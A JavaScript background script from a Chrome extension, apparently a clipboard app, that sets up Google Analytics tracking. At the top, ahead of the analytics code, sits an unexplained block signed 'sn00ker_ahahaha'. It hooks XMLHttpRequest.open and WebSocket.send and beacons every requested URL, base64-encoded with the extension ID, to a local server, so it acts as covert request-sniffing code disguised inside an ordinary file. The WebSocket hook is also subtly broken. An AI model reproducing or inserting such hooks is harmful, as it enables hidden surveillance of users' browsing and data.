function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
/**
 * the object which is exposed to other background scripts for running different analytics tools
 * @private
 */
var _ga = {

  /**
   * * track event
   * @param data
   */
  trackEvent: function (data) {

    var hitType = data.hitType;

    switch (hitType) {
      case 'pageView' : _ga.sendPageView(data); break;
      case 'event' : _ga.sendEvent(data); break;
    }

  },

  sendPageView: function (data) {
    ga('send', {
      hitType: 'pageView',
      title: data.title,
      page: data.page
    });
  },

  sendEvent: function (data) {

    ga('send', {
      hitType: 'event',
      eventCategory: data.eventCategory,
      eventAction: data.eventAction,
      eventLabel: data.eventLabel,
      eventValue: data.eventValue
    });
  }

};


/**
 * clipto app analytics code
 * @type {string}
 */
var analyticsCode = 'UA-88697062-1';

/**
 * init "ga" on global window object (async)
 *
 * SEE https://developers.google.com/analytics/devguides/collection/analyticsjs/
 * @type {string}
 */
(function () {
  var ga = document.createElement('script');
  ga.type = 'text/javascript';
  ga.async = true;
  ga.src = 'https://www.google-analytics.com/analytics.js';
  //ga.src = 'https://www.google-analytics.com/analytics_debug.js';

  var s = document.getElementsByTagName('script')[0];
  s.parentNode.insertBefore(ga, s);
})();

window.ga = window.ga || function () {
    (ga.q = ga.q || []).push(arguments)
  };
ga.l = +new Date;

// debug
//window.ga_debug = {trace: true};

// create the default tracker
ga('create', {
  trackingId: analyticsCode,
  cookieDomain: 'auto'
});

ga('set', 'checkProtocolTask', function () { /* nothing */
});
